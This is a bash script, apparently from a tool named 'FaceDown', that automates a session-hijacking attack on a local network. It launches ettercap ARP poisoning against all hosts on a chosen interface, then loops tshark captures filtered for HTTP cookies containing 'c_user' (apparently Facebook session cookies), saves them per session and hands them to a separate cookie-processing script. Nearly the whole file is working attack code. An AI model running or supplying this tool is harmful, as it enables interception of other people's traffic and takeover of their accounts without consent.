./Head
echo "  Specal Thanks To: \"Mahran Omairy\" & \"Ibrahim Abu-Kaff\""
time=$(date +%T)
sessionDate=$(date +%d-%m-%y)
ettercapVer=$(ettercap -v | grep "copyright" | cut -d " " -f 2)
tsharkVer=$(tshark -v | grep "TShark" | cut -d " " -f 2)
tsharkIsInstalled=$(expr length $ettercapVer)
ettercapIsInstalled=$(expr length $tsharkVer)
refreshRate=10
./Agreement.sh
echo ""
#############################
if [ $ettercapIsInstalled -eq 0 ] ;then
echo "Ettercap is not installed..."
echo "please intall it first: Try --{ sudo apt-get install ettercap }"
exit
fi
echo "Ettercap $ettercapVer is installed"
#############################
if [ $tsharkIsInstalled -eq 0 ] ;then
echo "TShark is not installed..."
echo "please intall it first: Try --{ sudo apt-get install tshark }"
exit
fi
echo "TShark $tsharkVer is installed"
sleep 2
##############################
echo ""
echo "This is The Folowing Interfaces"
ifconfig | cut -d " " -f 1 | grep -oE ".*[0-9]"
echo ""
echo "Input the interface you're working on and press [Enter]:" 
read iFace


#############################
cd Sessions
mkdir $sessionDate -p
cd $sessionDate
mkdir $time
cd $time
(echo "file:FaceDown/Sessions/$sessionDate/$time/sfd.log";echo "Facedown Session Started @ [[$sessionDate||||$time]]";echo "-------------------------------------------------------------------")>fdS.log
round=0
#############################
ettercapCommand=$(echo "ettercap -T -i $iFace -M arp // //")
xterm -e "./../../../Head & $ettercapCommand" &
{
while :
do 
counter=$refreshRate
round=$[$round+1]
#############################Start tshark
xterm -e "./../../../Head & tshark -i $iFace -R \"http.cookie contains c_user\" -z \"proto,colinfo,http.content_type,http.content_type\" -z \"proto,colinfo,http.content_length,http.content_length\" -z \"proto,colinfo,http.cookie,http.cookie\" > temp$round.txt" &
#############################
{
tsharkProcessId=$(ps -a | grep "xterm" | cut -d " " -f 1 | tail -1)
tsharkProcessIdd=$(ps -a | grep "xterm" | cut -d " " -f 2 | tail -1)
while [ $counter != 0 ]
do
clear
./../../../Head
cat fdS.log
echo "-------------------------------------------------------------------"
echo "               $counter sec left"
echo "        Working on: $iFace"
temp=$counter
counter=$[$temp-1]
sleep 1


done
}
############################# kill tshark

kill $tsharkProcessId
kill $tsharkProcessIdd
#############################if cookie is there view the HTML/page else remove the round file 
./../../../CookieDigging.sh temp$round.txt

############################# 
done
}


